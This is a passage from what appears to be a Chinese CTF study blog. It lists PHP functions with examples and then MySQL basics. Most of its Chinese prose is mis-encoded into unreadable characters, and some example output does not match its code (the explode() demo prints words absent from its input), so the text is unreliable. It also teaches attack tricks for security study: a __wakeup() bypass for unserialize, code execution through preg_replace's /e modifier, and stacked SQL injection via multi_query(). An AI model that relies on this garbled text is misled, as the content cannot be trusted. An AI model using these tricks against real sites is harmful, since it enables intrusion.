die(&quot;holyShit&quot;);</span></span><br></pre></td></tr></table></figure></li></ul><p><code>scandir($str)</code>    # æ‰«ææŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œè¿”å›å€¼ä¸ºæ–‡ä»¶åç»„æˆçš„æ•°ç»„</p><p><code>die(str)</code>ä¸<code>exit(str)</code>    # é€€å‡ºå½“å‰è„šæœ¬å¹¶å¼¹å‡º statusçŠ¶æ€æè¿°ï¼Œå…¶ä¸­æ¯”è¾ƒæœ‰è¶£çš„æ˜¯or die()è¿™ç§ç»„åˆã€‚å›  PHPå¹¶ä¸åŒºåˆ†æ•°æ®ç±»å‹ï¼Œæ‰€ä»¥$fileæ—¢å¯ä»¥æ˜¯intä¹Ÿå¯ä»¥boolï¼Œæ‰€ä»¥è¿™æ ·çš„è¯­å¥ä¸ä¼šæŠ¥é”™ï¼Œåœ¨å¤§å¤šæ•°çš„è¯­è¨€ä¸­ï¼Œbool or boolè¿™æ ·çš„è¯­å¥ä¸­ï¼Œè‹¥å‰ä¸€ä¸ªå€¼ä¸ºçœŸåä¸€ä¸ªå€¼å°±ä¸å†åˆ¤æ–­äº†ã€‚ä¾‹å¦‚ä¸‹åˆ—ä»£ç ï¼Œå¦‚æœ fopenå‡½æ•°æ‰§è¡Œæ­£ç¡®çš„è¯ï¼Œä¼šè¿”å›ä¸€ä¸ªå¤§äº0çš„intå€¼ï¼ˆæ–‡ä»¶æŒ‡é’ˆèµ„æºï¼Œè¿™å…¶å®å°±æ˜¯trueï¼‰ï¼Œåé¢çš„è¯­å¥å°±ä¸ä¼šæ‰§è¡Œäº†ï¼Œè€Œå¤±è´¥æ—¶è¿”å›false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;æŠ±æ­‰ï¼Œæ— æ³•æ‰“å¼€: <span class="subst">$filename</span>&quot;</span>);</span><br><span class="line"><span class="literal">true</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no1&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.1 passed&quot;</span>;</span><br><span class="line"><span class="literal">false</span> <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no2&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no.2 passed&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>no.1 passed<br>no2</blockquote><p><code>system(shell command)</code>    # æ‰§è¡Œshellå‘½ä»¤</p><p><code>file_get_contents($stream)</code>    # å°†æ•°æ®æµè¯»å…¥å­—ç¬¦ä¸²ï¼Œè‹¥php://inputä½œä¸ºå‚æ•°ï¼Œå°±å¯ä»¥å°†ç”¨æˆ·è¾“å…¥è¯»æˆå­—ç¬¦ä¸²</p><p><code>file($stream)</code>    # å°†æ•°æ®æµè¯»å…¥æ•°ç»„ï¼Œæ¯è¡Œä½œä¸€ä¸ªå…ƒç´ </p><p><code>highlight_file($filename,$return)</code>    # å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®è¾“å‡ºï¼Œ$returnå‚æ•°å¯é€‰ï¼Œé»˜è®¤ä¸ºfalseï¼›å½“ä¸ºtrueæ—¶è¿”å›å­—ç¬¦ä¸²è€Œä¸è¾“å‡º</p><p><code>extract($array)</code>    # è¾“å…¥ä¸€ä¸ªæ•°ç»„ï¼Œå°†æ•°ç»„ä¸­çš„å…ƒç´ è§£æåˆ°å¯¹åº”çš„å˜é‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=extract(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>$a = 3; $b = Dog; $c = Horse</blockquote><p><code>eregi($str1,$str2)</code>ä¸<code>ereg($str1,$str2)</code>    # åœ¨ str2ä¸­æœç´¢ str1ä¸­çš„å­—ç¬¦ï¼Œå­˜åœ¨æ—¶è¿”å› trueï¼Œè¿™ä¸¤ä¸ªå‡½æ•°å®Œå…¨ç›¸åŒï¼Œé™¤äº†å‰è€…å¿½ç•¥å¤§å°å†™ï¼Œåè€…ä¸å¿½ç•¥å¤§å°å†™ï¼Œå½“ç¬¬ä¸€ä¸ªå­—æ®µä¸ºç©º (NULL)æ—¶ï¼Œå°±ç»•è¿‡äº†æ­¤å‡½æ•° // è¿™ä¸¤ä¸ªå‡½æ•°éƒ½æ˜¯ PHP4ï¼ŒPHP5æ‰æœ‰ï¼Œè¾ƒä¸ºè¿œå¤</p><p><code>trim($str1, $str2)</code>    # å½“åªå¡«ä¸€ä¸ªå‚æ•°æ—¶ï¼Œtrimå‡½æ•°è¿”å›å»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦åçš„ç»“æœï¼›å½“å¡«äº†ç¬¬äºŒä¸ªå‚æ•°åï¼Œtrimå‡½æ•°è¿”å› $str1ä¸¤ç«¯å»é™¤ $str2æŒ‡å®šçš„å­—ç¬¦åçš„ç»“æœ</p><p><code>strstr($str1,$str2)</code>ä¸<code>stristr(\$str1,\$str2)</code>    # æŸ¥æ‰¾$str2åœ¨$str1ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹ï¼Œå¹¶è¿”å›å‰©ä½™éƒ¨åˆ†ï¼Œå¦‚$str1=â€abcdeâ€ï¼Œ$str2=â€cdâ€ï¼Œåˆ™è¿”å› â€œcdeâ€ã€‚å‰è€…ä¸¥æ ¼æ¯”è¾ƒå¤§å°å†™ï¼Œå¯ç”¨æ›´æ”¹å¤§å°å†™æ£€æŸ¥ç½‘é¡µæ˜¯å¦ä½¿ç”¨strstr()è¿›è¡Œè¿‡æ»¤ï¼›åè€…å¯¹å¤§å°å†™ä¸æ•æ„Ÿ</p><p><code>substr($str,$int1,$int2)</code>    # è¿”å›$strä¸­ç¬¬$int1ä¸ªå­—ç¬¦å¼€å§‹ï¼Œçš„$int2ä¸ªå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œå½“$int2ä¸è®¾ç½®æ—¶è¿”å›ç¬¬$int1ä¸ªå­—ç¬¦åçš„å…¨éƒ¨å­—ç¬¦</p><p><code>strcmp($str1, $str2)</code>    # æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œå½“ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰ï¼Œè¿”å› 0ï¼Œå‰è€…å¤§äºåè€…è¿”å› 1ï¼Œåè€…å¤§äºå‰è€…è¿”å› -1ï¼Œå­—ç¬¦ä¸²çš„å¤§å°æ ¹æ®è‡ªç„¶æ’åºæ¯”è¾ƒï¼Œå¤§æ¦‚å°±è·Ÿç€æ„Ÿè§‰èµ°çš„æ„æ€ â€¦</p><p><code>str_replace($str1,$str2,$str3)</code>    # æŠŠ$str3ä¸­å­˜åœ¨çš„æ‰€æœ‰$str1æ›¿æ¢ä¸º$str2</p><p><code>stripos($str1,$str2)</code>    # æŸ¥æ‰¾ str2åœ¨ str1ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œè¿”å› int</p><p><code>parse_str($str)</code>    # æŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æåˆ°å˜é‡ä¸­ï¼Œå¦‚parse_str(â€œname=Bill&amp;age=60â€); åˆ™ç°åœ¨æœ‰äº†ä¸¤ä¸ªå˜é‡$name=Bill å’Œ$age=60</p><p><code>str_split($str,$len)</code>    # æŠŠå­—ç¬¦ä¸²åˆ†å‰²åˆ°æ•°ç»„ä¸­ï¼ŒæŒ‰é•¿åº¦åˆ†å‰²ï¼Œ$lené»˜è®¤ä¸º1ï¼Œçœ‹ä¸ªä¾‹å­å°±æ˜ç™½äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(str_split(<span class="string">&quot;S hangh ai&quot;</span>,<span class="number">3</span>));</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>    &emsp;[0] => S h<br>    &emsp;[1] => ang<br>    &emsp;[2] => h a<br>    &emsp;[3] => i<br>)</blockquote><p><code>explode($str1,$str2)</code>    # $str1ä½œä¸ºåˆ†éš”ç¬¦ï¼Œä»¥æ­¤å°†å­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ï¼Œçœ‹ä¸ªä¾‹å­å°±æ˜ç™½äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hello World, I love You&quot;</span>;</span><br><span class="line">print_r (explode(<span class="string">&quot; &quot;</span>,<span class="variable">$str</span>));<span class="comment">//ç©ºæ ¼ä½œä¸ºåˆ†éš”ç¬¦</span></span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>&emsp;[0] => Hello<br>&emsp;[1] => world.<br>&emsp;[2] => I<br>&emsp;[3] => love<br>&emsp;[4] => Shanghai!<br>)</blockquote><p><code>preg_replace($pattern, $replacement, $subject)</code>    # å…¶ä¸­ {$patternä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œ$replacementä¸ºæ›¿æ¢å­—ç¬¦ä¸²ï¼Œ$subject ä¸ºè¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„} ã€‚è¿™ä¸ªå‡½æ•°æ­£åˆ™è¡¨è¾¾å¼$patternä»¥â€œ/eâ€ç»“å°¾æ—¶$replacementçš„å€¼ä¼šè¢«ä½œä¸ºPHPå‡½æ•°æ‰§è¡Œï¼Œä¾‹å¦‚æ‰§è¡Œpreg_replace (â€˜/test/eâ€™ , â€œphpinfo();â€ , â€œtestâ€)ï¼Œâ€œtestâ€ä¼šè¢«æ›¿æ¢ä¸º phpinfo();å¹¶æ‰§è¡Œ</p><p><code>preg_match($pattern, $str, $matches)</code>    # å…¶ä¸­ $patternä¸ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œ$strä¸ºè¢«æœç´¢çš„ç›®æ ‡å­—ç¬¦ä¸²ï¼Œè‹¥æä¾›äº†å‚æ•° $matchesï¼Œåˆ™ä¼šåœ¨åŒ¹é…åˆ°åè¢«è¿”å›ï¼Œä¸”é™„åŠ åœ¨å­—ç¬¦ä¸²ä¸­çš„ indexï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/(foo)(bar)(baz)/&#x27;</span>, <span class="string">&#x27;foobarbaz&#x27;</span>, <span class="variable">$matches</span>, PREG_OFFSET_CAPTURE);</span><br><span class="line">print_r(<span class="variable">$matches</span>);</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>Array(<br>&emsp;[0] => Array(<br>&emsp;&emsp;[0] => foobarbaz<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[1] => Array(<br>&emsp;&emsp;[0] => foo<br>&emsp;&emsp;[1] => 0<br>&emsp;)<br>&emsp;[2] => Array(<br>&emsp;&emsp;[0] => bar<br>&emsp;&emsp;[1] => 3)<br>&emsp;[3] => Array(<br>&emsp;&emsp;[0] => baz<br>&emsp;&emsp;[1] => 6<br>&emsp;)<br>)</blockquote><p><code>serialize()</code>ä¸<code>unserialize()</code>    # åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œäº’ä¸ºåå‡½æ•°ï¼Œåªéœ€äº†è§£åºåˆ—åŒ–å³å¯ï¼Œç®€å•æ¥è¯´å°±æ˜¯æŠŠå˜é‡è½¬ä¸º stringï¼Œä¿ç•™å…³äºåŸæœ¬æ•°æ®ç±»å‹çš„ä¿¡æ¯ï¼Œåºåˆ—åŒ–çš„å­˜åœ¨æ„ä¹‰åœ¨äºä½¿ä¸€åˆ‡å˜é‡çš„ä¼ è¾“æ— å¼‚äºå­—ç¬¦ä¸²ä¼ è¾“ï¼›ä½†éœ€è¦æ³¨æ„çš„æ˜¯privateå˜é‡åå‰ä¼šæœ‰%00åŒ…è£¹ç±»åå ä½</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Kyriota</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>=<span class="string">&quot;male&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">25</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weight</span>=<span class="number">60.5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$LoveCTF</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thingsDoentLike</span>=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$tags</span>=<span class="keyword">array</span>(<span class="string">&quot;Steam&quot;</span>,<span class="number">1990</span>,<span class="string">&quot;Aperture&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Kyriota()),<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]//åŸæœ¬æ— æ¢è¡Œç¬¦ä¸ä»»ä½•ç©ºæ ¼ï¼Œä¸ºäº†å¯è¯»æ€§è€Œæ‰‹åŠ¨æ·»åŠ <br>O:7:"Kyriota":6:{<br>&emsp;s:3:"sex";s:4:"male";<br>&emsp;s:3:"age";i:25;<br>&emsp;s:6:"weight";d:60.5;<br>&emsp;s:7:"LoveCTF";b:1;<br>&emsp;s:15:"thingsDoentLike";N;<br>&emsp;s:13:"%00Kyriota%00tags";a:3:{<br>&emsp;&emsp;i:0;s:5:"Steam";<br>&emsp;&emsp;i:1;i:1990;<br>&emsp;&emsp;i:2;s:8:"Aperture";<br>&emsp;}<br>}</blockquote><ul><li><p><code>__wakeup()</code>ä¸<code>__sleep()</code>    # åœ¨ serialize()çš„æ—¶å€™å…ˆæ‰§è¡Œ__sleep()ï¼Œå¯¹æ•°æ®é¢„å¤„ç†ï¼›åœ¨ unserialize()æ‰§è¡Œçš„æ—¶å€™å…ˆæ‰§è¡Œ__wakeup()ï¼Œå¯¹æ•°æ®å†å¤„ç†ã€‚å‡½æ•°å‘½åéå¸¸å½¢è±¡ï¼Œåºåˆ—åŒ–åå˜é‡ä¸å¯¹è±¡ä¸å†è¢«è§£æï¼Œç§°å…¶ä¸ºsleepä¸wakeupéå¸¸åˆé€‚</p></li><li><p>__wakeup()ç»•è¿‡ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºçš„å¯¹è±¡å±æ€§ä¸ªæ•°å¤§äºçœŸæ˜¯ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡ __wakeup()æ‰§è¡Œï¼Œä¾‹å¦‚ä¸‹é¢æ˜¯ä¸€æ­£å¸¸åºåˆ—åŒ–åçš„æ–‡æœ¬ï¼Œè€Œå½“3è¢«ç¯¡æ”¹ä¸ºä»»ä½•å¤§äº3çš„æ•°åï¼Œååºåˆ—åŒ–æ—¶å°†ä¸æ‰§è¡Œ__wakeup()ï¼š</p><center><code>O:7:â€Studentâ€:3:&#123;s:9:â€full_nameâ€;s:8:â€zhangsanâ€;s:5:â€scoreâ€;i:150;s:6:â€gradesâ€;a:0:&#123;&#125;&#125;</code></center></li><li><p><code>__construct()</code>ä¸<code>__destruct()</code>    # åœ¨åˆ›å»ºå¯¹è±¡æ—¶constructï¼Œåœ¨å¯¹è±¡é”€æ¯æ—¶destruct</p></li></ul><p>ä¸€ä¸ªç¨‹åºå³å¯è§£é‡Šåºåˆ—åŒ–ä»¥åŠä¸Šè¿°ç›¸å…³å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__construct~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__destrcut~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__wakeup~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;__sleep~&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>,<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=serialize(<span class="keyword">new</span> User(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;psswd&#x27;</span>));</span><br><span class="line"><span class="variable">$s_edited</span>=<span class="string">&#x27;O:4:&quot;User&quot;:3:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:5:&quot;psswd&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">unserialize(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;â†‘â†‘â†‘unserialized with wakeup and destruct&#x27;</span>,<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$s_edited</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;â†‘â†‘â†‘unserialized, only destruct whithout wakeup above this one&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote>[Out]<br>__construct~<br>__sleep~<br>__destrcut~<br>O:4:"User":2:{s:8:"username";s:5:"admin";s:8:"password";s:5:"psswd";}<br>__wakeup~<br>__destrcut~<br>â†‘â†‘â†‘unserialized with wakeup and destruct<br>__destrcut~<br>bool(false)<br>â†‘â†‘â†‘unserialized, only destruct whithout wakeup above this one<br><br>PHP Notice:  unserialize(): Unexpected end of serialized data on line 27<br>PHP Notice:  unserialize(): Error at offset 68 of 69 bytes on line 27</blockquote><code>mysql</code>ä¸<code>mysqli</code>    # mysqlè¿æ¥ï¼šæ¯å½“ç¬¬äºŒæ¬¡ä½¿ç”¨çš„æ—¶å€™ï¼Œéƒ½ä¼šé‡æ–°æ‰“å¼€ä¸€ä¸ªæ–°çš„è¿›ç¨‹ï¼›mysqliè¿æ¥ï¼šä¸€ç›´éƒ½åªä½¿ç”¨åŒä¸€ä¸ªè¿›ç¨‹<p><code>mysql_query($query)</code>    # æŸ¥è¯¢å•æ¡è¯­å¥ï¼Œä¸éœ€è¦æŸ¥è¯¢è¯­å¥ä»¥åˆ†å·ç»“æŸ</p><p><code>multi_query($query)</code>    # æŸ¥è¯¢å¤šæ¡è¯­å¥ï¼Œè¯­å¥é—´ä»¥åˆ†å·åˆ†éš”ï¼Œç»“å°¾ä¸éœ€è¦åˆ†å·ï¼Œå½“æ·»åŠ åˆ†å·å‘ç°æ˜¯ä»¥<code>multi_query()</code>æŸ¥è¯¢çš„æ—¶å€™ï¼Œå¯ä»¥è¿›è¡Œå †å æ³¨å…¥ï¼Œè¿½åŠ ä»»ä½•mysqlæŸ¥è¯¢è¯­å¥</p><p><code>mysql_fetch_xxx</code>    # è¿™ç§ç±»å‹çš„å‡½æ•°éƒ½æ˜¯ä»ç»“æœé›†ä¸­å–å‡ºä¸€è¡Œ</p><table><thead><tr><th>func</th><th>return</th></tr></thead><tbody><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_array.asp">mysql_fetch_array()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ï¼Œæˆ–æ•°å­—æ•°ç»„ï¼Œæˆ–äºŒè€…å…¼æœ‰</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_assoc.asp">mysql_fetch_assoc()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_field.asp">mysql_fetch_field()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—åˆ—ä¿¡æ¯å¹¶ä½œä¸ºå¯¹è±¡è¿”å›</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_lengths.asp">mysql_fetch_lengths()</a></td><td>å–å¾—ç»“æœé›†ä¸­æ¯ä¸ªå­—æ®µçš„å†…å®¹çš„é•¿åº¦</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_object.asp">mysql_fetch_object()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå¯¹è±¡</td></tr><tr><td><a href="https://www.w3school.com.cn/php/func_mysql_fetch_row.asp">mysql_fetch_row()</a></td><td>ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºæ•°å­—æ•°ç»„</td></tr></tbody></table><hr><h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a><big><center>SQL</center></big></h1><h2 id="MySQLåŸºç¡€å‘½ä»¤"><a href="#MySQLåŸºç¡€å‘½ä»¤" class="headerlink" title="MySQLåŸºç¡€å‘½ä»¤"></a><big>MySQLåŸºç¡€å‘½ä»¤</big></h2><ul><li><p>é€šè¿‡å‘½ä»¤è¡Œè¾“å…¥ mysql -u root -pï¼Œç„¶åè¾“å…¥å¯†ç å³å¯ç™»å½•</p><ul><li>è‹¥æŠ¥é”™ï¼Œå¯èƒ½æ˜¯ mysql æœåŠ¡æœªå¯åŠ¨ï¼Œä¹Ÿå¯èƒ½æ˜¯éœ€è¦ç®¡ç†å‘˜æƒé™çš„ cmd</li></ul></li><li><p>SHOW DATABASES; #æŸ¥çœ‹å½“å‰æ•°æ®åº“</p></li><li><p>SHOW TABLES; #æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­çš„æ‰€æœ‰æ•°æ®è¡¨åç§°</p></li><li><p>DESCRIBE table; #æŸ¥çœ‹æ•°æ®è¡¨ç»“æ„ï¼Œå¦‚å‚æ•°ååŠæ•°æ®ç±»å‹</p><ul><li>SHOW COLUMNS FROM table1,table2â€¦; #å’Œä¸Šé¢çš„DESCRIBEä¸€æ ·ï¼Œåªæ˜¯è¿™å¯ä»¥åŒæ—¶é€‰æ‹©å¤šä¸ªè¡¨</li></ul></li><li><p>USE database; #è¿›å…¥æŸä¸€æ•°æ®åº“ä¸‹è¿›è¡Œæ“ä½œ</p></li><li><p>CREATE DATABASE database; #æ–°å»ºæ•°æ®åº“</p></li><li><p>CREATE TABLE table(row1 type1,row2 type2â€¦); #åœ¨è¿›å…¥æŸä¸€æ•°æ®åº“çš„å‰æä¸‹æ–°å»ºæ•°æ®è¡¨</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Person (Name varchar(25),Address varchar(80),Age int(11)) </span><br></pre></td></tr></table></figure></li><li><p>INSERT INTO table VALUES(value1, value2, â€¦); #å‘æ•°æ®è¡¨åŠ å…¥æ•°æ®</p></li><li><p>DELETE FROM table WHERE condition; #åˆ é™¤ç¬¦åˆconditionçš„æ•°æ®</p></li><li><p>ALTER TABLE table DROP column; #åˆ é™¤åˆ—</p></li><li><p>UPDATE table SET col.1=value.1 WHERE col.2=value.2; #ä¿®æ”¹æ•°æ®ï¼Œcol.1=value.1ä¸ºèµ‹å€¼è¯­å¥ï¼Œcol.2=value.2ä¸ºæŸ¥æ‰¾é¡¹</p></li><li><p>SELECTï¼šç”¨äºæŸ¥è¯¢æ•°æ®ï¼Œè™½ç›´è¯‘ä¸ºâ€˜é€‰æ‹©â€™ï¼Œä½†æˆ‘è®¤ä¸ºå…¶ä¸var_dumpç±»ä¼¼</p><ul><li><p><a href="dev.mysql.com/doc/refman/8.0/en/handler.html">HANDLER</a>ï¼šMySQLçš„ä¸“ç”¨æŸ¥è¯¢è¯­å¥ï¼Œæä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HANDLER users OPEN;</span><br><span class="line">HANDLER user READ NEXT;</span><br><span class="line">HANDLER user CLOSE;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>show warnings; #æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯.</p></li><li><p>æ³¨é‡Šç¬¦ï¼šâ€œ#â€ä¸  â€œâ€“ â€(ä¸¤ä¸ªå‡å·åé¢å¸¦ä¸€ä¸ªç©ºæ ¼)ï¼Œæ³¨æ„GETæ–¹æ³•ä¼ å‚éœ€è¦å…ˆurlç¼–ç ï¼›ä»¥åŠåŒºåŸŸæ³¨é‡Šç¬¦/*æ³¨é‡Šå†…å®¹*/</p></li></ul><p>æ³¨æ„ï¼šå½“æ•°å­—å‹å­—ç¬¦æˆ–MySQLå…³é”®å­—ä½œä¸ºå­—æ®µã€è¡¨ã€åº“åæŸ¥è¯¢æ—¶ï¼Œåº”è¯¥ç”¨åå•å¼•å·æ‹¬èµ·æ¥ï¼Œå¦‚ SELECT * FROM &#96;2333&#96;Â WHERE &#96;from&#96;=&#96;8080&#96;;å…¶ä¸­çš„2333ä½œä¸ºè¡¨åï¼Œfromä½œä¸ºå­—æ®µåï¼Œ8080ä½œä¸ºå­—æ®µå†…å®¹Â </p><h2 id="MySQL-DICT"><a href="#MySQL-DICT" class="headerlink" title="MySQL DICT"></a><big>MySQL DICT</big></h2><ul><li><p><code>UNION</code>ï¼šç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECTè¯­å¥çš„ç»“æœé›†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">select uname,passwd from users</span><br><span class="line">union</span><br><span class="line">select &#39;Union&#39;,233;</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| uname    | passwd      |</span><br><span class="line">        #+----------+-------------+</span><br><span class="line">        #| Kyriota  | kyriotayyds |</span><br><span class="line">        #| 0test    | 0test       |</span><br><span class="line">        #| 233test  | 233test     |</span><br><span class="line">        #| admin    | adpasswd    |</span><br><span class="line">        #| Dr.Who   | Doctor      